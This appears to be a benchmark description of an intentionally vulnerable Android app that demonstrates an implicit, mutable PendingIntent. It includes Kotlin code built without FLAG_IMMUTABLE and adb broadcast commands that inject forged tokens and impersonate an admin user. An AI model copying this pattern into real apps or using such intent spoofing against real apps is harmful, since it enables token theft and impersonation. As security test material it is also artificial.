# oxo-android-ben38: Implicit Pending Intent Vulnerability

## Vulnerability Overview

Implicit Pending Intent occurs when Android applications create PendingIntent objects without proper security flags (`FLAG_IMMUTABLE`), allowing malicious applications to intercept, modify, or steal the intent and its sensitive data. This vulnerability can lead to privilege escalation, data theft, and unauthorized actions through mutable PendingIntents.

## Attack Vector: Intent Hijacking with Data Replacement

**Brief Explanation**: Exploitation of mutable PendingIntents in notifications to intercept and replace sensitive data like authentication tokens and user IDs through broadcast intent manipulation.

**Key Characteristics:**
- Creates PendingIntent without `FLAG_IMMUTABLE` (Android 12+ requirement)
- Embeds sensitive data in intent extras (user tokens, credentials)
- Uses implicit intents that can be hijacked by malicious apps
- Allows intent modification by third-party applications

**Vulnerable Code Pattern:**
```kotlin
// VULNERABLE: No FLAG_IMMUTABLE, allows intent modification
val notificationIntent = Intent("com.newsreader.OPEN_ARTICLE")
notificationIntent.putExtra("user_token", "sensitive_jwt_token_12345")
notificationIntent.putExtra("user_id", "user_001")

val pendingIntent = PendingIntent.getBroadcast(
    this, 0, notificationIntent,
    PendingIntent.FLAG_UPDATE_CURRENT  // Missing FLAG_IMMUTABLE!
)
```

## Testing

```bash
# Basic intent hijacking attack
adb shell am broadcast -a com.newsreader.OPEN_ARTICLE \
  --es user_token "HIJACKED_JWT_TOKEN_ABC123" \
  --es user_id "MALICIOUS_ATTACKER_001"

# Token theft simulation  
adb shell am broadcast -a com.newsreader.OPEN_ARTICLE \
  --es user_token "STOLEN_TOKEN_XYZ789"

# User impersonation attack
adb shell am broadcast -a com.newsreader.OPEN_ARTICLE \
  --es user_id "admin_user" \
  --es user_token "elevated_privileges_token"

# Multi-parameter hijacking
adb shell am broadcast -a com.newsreader.OPEN_ARTICLE \
  --es user_token "fake_token_123" \
  --es user_id "attacker" \
  --es session_id "hijacked_session" \
  --es admin_flag "true"

# Monitor intent traffic
adb shell dumpsys activity broadcasts | grep -A 5 -B 5 "newsreader"
```

**Difficulty**: Medium

## Impact Assessment

- **Confidentiality**: High - Can extract sensitive JWT tokens and user credentials
- **Integrity**: High - Can modify intended actions and parameters
- **Availability**: Medium - Can disrupt normal app functionality
- **OWASP Mobile Top 10**: M6 - Insecure Authorization, M2 - Insecure Data Storage
- **CWE**: CWE-926 (Improper Export of Android Application Components), CWE-200 (Information Exposure)